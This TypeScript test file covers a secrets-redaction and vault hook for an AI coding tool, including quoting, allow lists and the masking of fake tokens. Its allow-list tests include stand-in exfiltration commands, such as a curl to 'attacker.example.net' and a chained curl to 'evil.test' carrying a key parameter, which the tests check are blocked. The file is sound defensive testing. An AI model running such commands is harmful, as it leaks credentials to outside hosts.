// Secrets, the pure part. Every "secret" here is a fake built at run time.
import { describe, expect, test } from 'claude-code/testing'
import { statusLine } from '../hooks/progress'
import {
  allValues, base64, checkName, disallowedUse, effectiveEntries, firstProgram, formsOf, hostsIn, isExampleFile, nextPastedName,
  parseAllow, parseEnv, parseVaultStore, placeholderNames, quoteFor, redact, redactContent, sectionText, substitute,
} from '../hooks/secrets/redact'
import { fake, FAKES, KIND, randomFake } from './fakes'

const P = (name: string) => `{{secret:${name}}}`

describe('secrets: names', () => {
  test('a name is UPPER_SNAKE_CASE; a token typed as a name is refused without echoing it', () => {
    expect(checkName('api-key')).toEqual({ name: 'API_KEY' })
    expect(checkName('STRIPE_SECRET_KEY')).toEqual({ name: 'STRIPE_SECRET_KEY' })
    expect('error' in checkName('9lives')).toBe(true)
    for (const token of [FAKES.github!, FAKES.stripe!, FAKES.aws!, FAKES.anthropic!, randomFake(32)]) {
      const checked = checkName(token)
      expect('error' in checked && checked.error).toContain('looks like a secret value')
      expect(JSON.stringify(checked)).not.toContain(token)
    }
  })

  test('PASTED_<n> takes the first free number', () => {
    expect(nextPastedName([])).toBe('PASTED_1')
    expect(nextPastedName(['PASTED_1', 'PASTED_3'])).toBe('PASTED_2')
  })
})

describe('secrets: the vault store', () => {
  test('the first shape (name → value) reads as all-projects secrets with nothing allowed', () => {
    const v = randomFake(16)
    expect(parseVaultStore({ API_TOKEN: v, bad: 1 })).toEqual({ global: { API_TOKEN: { value: v, allow: [] } }, projects: {} })
  })

  test('a project overrides all-projects; masking knows every project', () => {
    const [a, b, c] = [randomFake(16), randomFake(16), randomFake(16)]
    const store = parseVaultStore({
      global: { API_TOKEN: { value: a, allow: [] } },
      projects: { 'C:/p': { API_TOKEN: { value: b, allow: ['curl'] } }, 'C:/q': { OTHER: { value: c, allow: [] } } },
    })
    expect(effectiveEntries(store, 'C:/p').API_TOKEN!.value).toBe(b)
    expect(effectiveEntries(store, 'C:/p').OTHER).toBeUndefined()
    expect(allValues(store, 'C:/p').map(([, v]) => v).sort()).toEqual([a, b, c].sort())
  })
})

describe('secrets: placeholders, quoting and where a command goes', () => {
  test('placeholders are found; an escaped one is literal text, not a use', () => {
    expect(placeholderNames(`a ${P('API_TOKEN')} \\${P('DOC_NAME')} ${P('NOPE')} ${P('API_TOKEN')}`)).toEqual(['API_TOKEN', 'NOPE'])
    const out = substitute(`docs: \\${P('NAME')} and ${P('NOPE')}`, {})
    expect(out.text).toBe(`docs: ${P('NAME')} and ${P('NOPE')}`)
    expect(out.missing).toEqual(['NOPE'])
  })

  test('bash: quoted for where the placeholder stands, so metacharacters stay data', () => {
    const v = `a'b"c$d\`e\\f%g\nh`
    expect(substitute(`curl -u ${P('V')} x`, { V: v }, 'bash').text).toBe(`curl -u 'a'\\''b"c$d\`e\\f%g\nh' x`)
    expect(substitute(`curl -H "X: ${P('V')}" x`, { V: v }, 'bash').text).toBe(`curl -H "X: a'b\\"c\\$d\\\`e\\\\f%g\nh" x`)
    expect(substitute(`echo 'k=${P('V')}'`, { V: v }, 'bash').text).toBe(`echo 'k=a'\\''b"c$d\`e\\f%g\nh'`)
    // A quote escaped outside quotes does not open a quoted span.
    expect(substitute(`echo \\" ${P('V')}`, { V: 'x' }, 'bash').text).toBe(`echo \\" 'x'`)
  })

  test('PowerShell: single quotes doubled, or backtick escapes inside double quotes', () => {
    const v = `a'b"c$d\`e`
    expect(quoteFor('powershell', 'none', v)).toBe(`'a''b"c$d\`e'`)
    expect(substitute(`$h = "Bearer ${P('V')}"`, { V: v }, 'powershell').text).toBe('$h = "Bearer a\'b`"c`$d``e"')
    expect(substitute(`Write-Host '${P('V')}'`, { V: v }, 'powershell').text).toBe(`Write-Host 'a''b"c$d\`e'`)
  })

  test('the first program, past assignments, wrappers and paths', () => {
    expect(firstProgram('FOO=1 BAR=2 kubectl get pods')).toBe('kubectl')
    expect(firstProgram('sudo /usr/bin/curl -s x')).toBe('curl')
    expect(firstProgram('C:\\tools\\npm.cmd test')).toBe('npm')
    expect(firstProgram('  ')).toBe(null)
  })

  test('the hosts a command names: URLs, user@host, IPv4', () => {
    expect(hostsIn('curl https://api.example.com/x && scp f deploy@box.example.org:/tmp && nc 10.0.0.5 80').sort()).toEqual(
      ['10.0.0.5', 'api.example.com', 'box.example.org'],
    )
    expect(hostsIn('kubectl get pods -n prod')).toEqual([])
  })

  test('allowed: the first program, and every host (a host covers its subdomains)', () => {
    const allow = parseAllow('Curl, https://example.com/path  kubectl')
    expect(allow).toEqual(['curl', 'example.com', 'kubectl'])
    expect(disallowedUse(allow, 'curl https://api.example.com/v1')).toBe(null)
    expect(disallowedUse(allow, 'kubectl get secrets')).toBe(null)
    expect(disallowedUse(allow, 'curl https://attacker.example.net/c')).toBe('attacker.example.net')
    expect(disallowedUse(allow, 'kubectl get x; curl https://evil.test/?k=1')).toBe('evil.test')
    expect(disallowedUse(allow, 'node -e "1"')).toBe('node')
    expect(disallowedUse([], 'curl x')).toBe('curl')
  })
})

describe('secrets: redaction by format', () => {
  for (const [name, value] of Object.entries(FAKES)) {
    test(`a ${name} token is masked`, () => {
      const out = redact(`before ${value} after`, {})
      expect(out.text).not.toContain(value)
      expect(out.text).toContain(`«redacted:${KIND[name] ?? name}»`)
      expect(out.text.startsWith('before ')).toBe(true)
    })
  }

  test('a bearer header, a URL password and Basic auth keep their frame and mask the secret', () => {
    const t = randomFake(40)
    expect(redact(`Authorization: Bearer ${t}`, {}).text).toBe('Authorization: Bearer «redacted:bearer»')
    const pw = randomFake(16)
    expect(redact(`postgres://admin:${pw}@db.example.com:5432/app`, {}).text).toBe('postgres://admin:«redacted:url-password»@db.example.com:5432/app')
    expect(redact(`Authorization: Basic ${base64(`user:${pw}`)}`, {}).text).toBe('Authorization: Basic «redacted:basic-auth»')
    expect(redact('Basic usage of the API', {}).text).toBe('Basic usage of the API')
    expect(redact('postgres://user:${DB_PASSWORD}@db/app', {}).text).toBe('postgres://user:${DB_PASSWORD}@db/app')
  })

  test('a real-looking assignment keeps its key and masks its value', () => {
    const v = randomFake(20)
    expect(redact(`DB_PASSWORD=${v}`, {}).text).toBe('DB_PASSWORD=«redacted:value»')
    expect(redact(`  "apiKey": "${v}",`, {}).text).toBe('  "apiKey": "«redacted:value»",')
    expect(redact(`export STRIPE_SECRET_KEY='${v}'`, {}).text).toBe("export STRIPE_SECRET_KEY='«redacted:value»'")
    expect(redact(`DB_PASSWORD=${v}`, {}, { skipAssignments: true }).text).toBe(`DB_PASSWORD=${v}`)
  })

  test('ordinary code and example files are left alone', () => {
    for (const line of [
      'const API_KEY_HEADER = "x-api-key"',
      'TOKEN_TYPE: "Bearer"',
      "const VAULT_KEY = 'secrets.vault'",
      'STRIPE_SECRET_KEY=your-stripe-secret-key',
      'API_KEY=<your api key>',
      'PASSWORD=changeme',
      'API_KEY=xxxxxxxxxxxxxxxxxxxx',
      "const passwordField = 'password'",
      'secretName: my-app-secrets',
      'type Keys = keyof typeof KEYS',
      'const apiKey = process.env.API_KEY',
      'TOKEN_TTL=3600',
      'privateKeyPath: ./certs/key.pem',
      'monkey: banana',
      'const token = getToken()',
      `API_KEY=${P('API_KEY')}`,
      'password: ${DB_PASSWORD}',
      'isPrivate = true',
      'SESSION_SECRET=example-session-secret-123',
      'cacheKey: user_profile_v2_cache',
    ]) expect(redact(line, {}).text).toBe(line)
  })

  test('example files are known by name', () => {
    for (const p of ['C:/a/.env.example', '/x/.env.sample', 'config.example.json', 'app.env.template', 'settings.dist']) expect(isExampleFile(p)).toBe(true)
    for (const p of ['C:/a/.env', '/x/.env.local', 'src/example.ts', 'examples/run.ts']) expect(isExampleFile(p)).toBe(false)
  })
})

describe('secrets: redaction of vault values and their transforms', () => {
  const value = 'Fk' + randomFake(24) + '/+"\\'
  const vault = { API: value }
  const masked = (text: string) => {
    const out = redact(text, vault)
    return !out.text.includes(value) && out.hits.includes('API')
  }

  test('plain, upper, lower, reversed, hex', () => {
    expect(redact(`x ${value} y`, vault).text).toBe(`x ${P('API')} y`)
    expect(masked(value.toUpperCase())).toBe(true)
    expect(masked(value.toLowerCase())).toBe(true)
    expect(masked([...value].reverse().join(''))).toBe(true)
    const hex = [...value].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
    expect(masked(hex)).toBe(true)
    expect(masked(hex.toUpperCase())).toBe(true)
  })

  test('base64 at every alignment inside longer text, base64url, JSON and URL escaping', () => {
    for (const prefix of ['', 'x', 'xy', 'xyz']) {
      const out = redact(base64(`${prefix}${value}tail`), vault)
      expect(out.hits).toContain('API')
    }
    expect(masked(base64(value).replace(/\+/g, '-').replace(/\//g, '_'))).toBe(true)
    expect(masked(JSON.stringify({ k: value }))).toBe(true)
    expect(masked(`?k=${encodeURIComponent(value)}`)).toBe(true)
  })

  test('HTTP Basic auth of user:value', () => {
    const out = redact(`Authorization: Basic ${base64(`user:${value}`)}`, vault)
    expect(out.text).not.toContain(base64(`user:${value}`))
  })

  test('forms shorter than 6 characters are not looked for', () => {
    expect(formsOf('abc')).toEqual([])
  })

  test('the longest value wins when one value contains another', () => {
    const short = 'abc' + fake(2)
    expect(redact(`x ${short}-more y ${short}`, { SHORT: short, LONG: short + '-more' }).text).toBe(`x ${P('LONG')} y ${P('SHORT')}`)
  })

  test('only high-confidence tokens may be vaulted', () => {
    const asked: string[] = []
    const out = redact(`use ${FAKES.stripe} and DB_PASSWORD=${randomFake(20)}`, {}, { onUnknown: (_v, kind) => (asked.push(kind), 'PASTED_1') })
    expect(asked).toEqual(['stripe'])
    expect(out.text).toBe(`use ${P('PASTED_1')} and DB_PASSWORD=«redacted:value»`)
  })

  test('a row: text blocks and tool results masked; example reads keep assignments', () => {
    const assigned = `DB_PASSWORD=${randomFake(20)}`
    const content = [
      { type: 'text', text: `see ${value}` },
      { type: 'tool_result', tool_use_id: 't1', content: `out ${FAKES.github} ${assigned}` },
      { type: 'tool_result', tool_use_id: 't2', content: [{ type: 'text', text: `${FAKES.jwt}\n${assigned}` }, { type: 'image', source: {} }] },
      { type: 'tool_use', id: 't3', name: 'Bash', input: { command: 'ls' } },
    ]
    const out = redactContent(content, vault, new Set(['t2']))!
    const text = JSON.stringify(out.content)
    expect(text).not.toContain(FAKES.github)
    expect(text).not.toContain(FAKES.jwt)
    expect(out.content[0]).toEqual({ type: 'text', text: `see ${P('API')}` })
    expect(JSON.stringify(out.content[1])).not.toContain(assigned)
    expect(JSON.stringify(out.content[2])).toContain(assigned)
    expect(out.content[3]).toEqual(content[3])
    expect(redactContent([{ type: 'text', text: 'clean' }], vault)).toBe(null)
  })
})

describe('secrets: .env, prompt section, status line', () => {
  test('.env lines parse: quotes, comments, a multi-line quoted PEM key, escaped newlines', () => {
    const v1 = 'v1-' + fake(2)
    const pem = FAKES['private-key']!
    const text = `# comment\nexport API_TOKEN="${v1}"\nDB_URL=postgres://u:p@h/db # trailing\nempty=\nKEY_PEM="${pem}"\nONE_LINE="a\\nb"\n  lower-name = 'x y'\nnot a line\n`
    expect(parseEnv(text)).toEqual([
      { name: 'API_TOKEN', value: v1 },
      { name: 'DB_URL', value: 'postgres://u:p@h/db' },
      { name: 'KEY_PEM', value: pem },
      { name: 'ONE_LINE', value: 'a\nb' },
      { name: 'LOWER_NAME', value: 'x y' },
    ])
  })

  test('the system section names secrets, explains allow, escaping and marks, and holds no value', () => {
    const text = sectionText(['API_TOKEN', 'DB_PASSWORD'])
    expect(text).toContain(P('NAME'))
    expect(text).toContain(`\\${P('NAME')}`)
    expect(text).toContain('«redacted:...» mark')
    expect(text).toContain('allowed')
    expect(text).toContain('Available secret names: API_TOKEN, DB_PASSWORD.')
    expect(sectionText([])).toContain('The vault is empty.')
  })

  test('the status line counts the vault', () => {
    const snapshot = { version: 1 as const, generatedAt: '', mainRoot: 'C:/r', current: null, worktrees: [], board: null }
    expect(statusLine({ snapshot, checks: {}, running: null, skill: null, secrets: 3 })).toContain('🔐 3')
    expect(statusLine({ snapshot, checks: {}, running: null, skill: null, secrets: 0 })).not.toContain('🔐')
  })
})
